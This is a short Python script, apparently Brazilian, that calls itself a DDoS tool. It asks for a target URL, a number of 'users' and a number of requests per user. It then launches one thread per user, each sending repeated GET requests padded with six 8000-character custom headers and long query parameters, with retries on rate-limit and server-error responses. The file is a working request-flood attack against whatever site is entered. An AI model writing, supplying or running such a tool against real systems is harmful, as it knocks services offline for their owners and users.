# Import module
import threading
import requests
from time import sleep

from util import red, green, white

from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.retry import Retry

headers = {
    "User-Agent": "My Custom User Agent",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "en-US,en;q=0.9",
    "Connection": "keep-alive",
    "Cache-Control": "max-age=0",
    "Upgrade-Insecure-Requests": "1",
    "Custom-Header-1": "X" * 8000, 
    "Custom-Header-2": "Y" * 8000,
    "Custom-Header-3": "Z" * 8000,
    "Custom-Header-4": "P" * 8000,
    "Custom-Header-5": "T" * 8000,
    "Custom-Header-6": "O" * 8000,

}

params = {
    "parametro1": "x" * 1000,
    "parametro2": "y" * 1000,
    "parametro3": "z" * 1000,
}
  
  
def unleash_hell(url: str, interactions: int = 1, thread_name="User"):
    """
    Unleashs hell upon a given domain whose is given as the first arg of the function. 
    The second arg is the number of requests that should be made.
    """

    session = requests.Session()
    retry_strategy = Retry(
        total=interactions,
        status_forcelist=[429, 500, 502, 503, 504],
    )
    adapter = HTTPAdapter(max_retries=retry_strategy)
    session.mount("http://", adapter)
    session.mount("https://", adapter)

    thread_name = thread_name + ":"
    for interaction in  range(interactions):
        try:
            response = session.get(url, headers=headers, params=params)

            if response.status_code == 200:
                print(white + f"{thread_name}" + green + "\n Requisição feita com sucesso! ✓" + white) 
            else:
                print(red + f'Erro na requisição: {response.status_code}' + white)
        except Exception as e:
            print(red + f"Erro durante a requisição: {e}" + white)
            
        

def run_threads(users: int, target: str, interactions: int = 1, user_name="User "):
  threads = []

  for user in range(users):
    individual_thread = threading.Thread(target=unleash_hell, args=(target, interactions, f"{user_name} {user}: "))
    threads.append(individual_thread)
    individual_thread.start()

  # This ensures that all threads finish before the main flow of application continues
  for individual_thread in threads:
    individual_thread.join()

  print("Todas as threads foram executadas.")


def ddos_tool():
    users = int(input("Digite a quantidade de usuários que deseja usar nessa simulação:"))
    interactions = int(input("Digite a quantidade de interações por usuário que deseja fazer nessa simulação:"))
    target = input("Digite a url do alvo:").strip()

    run_threads(users, target, interactions,)